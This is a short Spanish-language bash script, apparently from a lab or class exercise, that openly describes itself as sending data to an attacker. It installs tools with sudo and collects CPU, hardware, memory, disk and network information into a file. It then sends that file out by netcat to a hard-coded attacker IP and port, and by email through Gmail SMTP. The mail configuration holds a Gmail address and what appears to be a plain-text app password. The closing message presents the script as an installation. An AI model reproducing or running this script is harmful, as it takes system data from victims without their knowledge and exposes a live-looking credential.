#!/bin/bash

# -------------------------------
# Configuración
# -------------------------------
ATACANTE_IP="192.168.244.128"
PUERTO=4444
ARCHIVO="datos.txt"

# -------------------------------
# Verificar e instalar herramientas necesarias
# -------------------------------

function instalar_si_falta() {
    if ! command -v "$1" &> /dev/null; then
        echo "[*] Instalando $1..."
        sudo apt-get update && sudo apt-get install -y "$1"
    else
        echo "[*] $1 ya está instalado."
    fi
}

instalar_si_falta "netcat"
instalar_si_falta "lshw"
instalar_si_falta "lscpu"
instalar_si_falta "mailutils"
instalar_si_falta "msmtp-mta mailutils"

# -------------------------------
# Recolectar datos del sistema
# -------------------------------

echo "[*] Recolectando información del sistema..."
{
    echo "------ INFORMACIÓN DE CPU ------"
    lscpu
    echo -e "\n------ INFORMACIÓN DE HARDWARE ------"
    sudo lshw -short
    echo -e "\n------ INFORMACIÓN DE MEMORIA ------"
    free -h
    echo -e "\n------ INFORMACIÓN DEL DISCO ------"
    df -h
    echo -e "\n------ INFORMACIÓN DE RED ------"
    ip a
} > "$ARCHIVO"

echo "[*] Datos recopilados en '$ARCHIVO'"

# -------------------------------
# Enviar datos al atacante
# -------------------------------

echo "[*] Enviando datos a $ATACANTE_IP:$PUERTO..."
cat <<EOF > ~/.msmtprc
defaults
auth on
tls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile ~/.msmtp.log

account gmail
host smtp.gmail.com
port 587
from gaspar.castro.utu@gmail.com
user gaspar.castro.utu@gmail.com
password foilbwtuwutzlxvw

account default : gmail
EOF
chmod 600 ~/.msmtprc
echo "Informacion de hardware" | mail -s "Info Hardware" -A datos.txt gaspar.castro.utu@gmail.com

timeout 5 nc "$ATACANTE_IP" "$PUERTO" < $ARCHIVO
echo "[*] Datos enviados con éxito."

# -------------------------------
# Limpieza opcional
# -------------------------------
# rm -f "$ARCHIVO"  # Descomentar para borrar los datos luego de enviarlos

echo "[*] Instalación completada."
